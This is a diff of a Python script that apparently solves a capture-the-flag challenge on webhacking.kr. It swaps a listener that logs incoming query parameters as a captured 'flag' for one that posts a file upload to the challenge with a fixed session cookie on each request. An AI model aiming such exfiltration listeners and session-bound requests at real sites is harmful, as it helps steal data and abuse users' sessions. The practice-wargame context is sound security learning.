@@ -1,28 +1,50 @@
-import http.server
-import socketserver
-import time
-from urllib.parse import urlparse, parse_qs
+import requests
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import threading
 
-class CustomHandler(http.server.SimpleHTTPRequestHandler):
+# Configuration
+URL = "https://webhacking.kr/challenge/web-18/"
+SESSION_ID = "1"
+cookies = {'PHPSESSID': SESSION_ID}
+
+# Function to upload the file
+def upload_file():
+    filename = "aksd"  # Fixed filename for the upload
+    data = '37.60.42.105'  # Content you want to upload
+
+    # Prepare the files for upload
+    files = {
+        'upfile': (filename, data, 'text/plain')  # Specify the MIME type
+    }
+
+    try:
+        response = requests.post(URL, cookies=cookies, files=files)  # Using files for upload
+        print(f"Uploaded {filename}: {response.status_code}, Response: {response.text}")
+        if response.status_code != 200:
+            print("Upload failed.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+# HTTP Server Handler
+class RequestHandler(BaseHTTPRequestHandler):
     def do_GET(self):
+        # Call the upload function when a GET request is received
+        print("Received a GET request, initiating file upload...")
+        upload_file()  # Trigger the upload
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
+        self.wfile.write(b"Upload initiated.")
 
-        # Parse the URL and query parameters
-        parsed_path = urlparse(self.path)
-        query_params = parse_qs(parsed_path.query)
-        print("flag is: %s" % query_params)
+# Run HTTP Server in a Thread
+def run_http_server():
+    server_address = ('', 7777)  # Listen on port 7777
+    httpd = HTTPServer(server_address, RequestHandler)
+    print('Starting server on port 7777...')
+    httpd.serve_forever()
 
-    def log_message(self, format, *args):
-        # Override to print to console instead of error log
-        print(f"{self.client_address[0]} - [{time.asctime()}] {format%args}")
+# Start the HTTP server in a separate thread
+http_thread = threading.Thread(target=run_http_server)
+http_thread.start()
 
-def run_server(port=7777):
-    with socketserver.TCPServer(("", port), CustomHandler) as httpd:
-        print(f"Server running on port {port}")
-        print("Ready to receive messages. Send a GET request'")
-        httpd.serve_forever()
-
-if __name__ == "__main__":
-    run_server()
+# Server will keep running and respond to incoming requests.
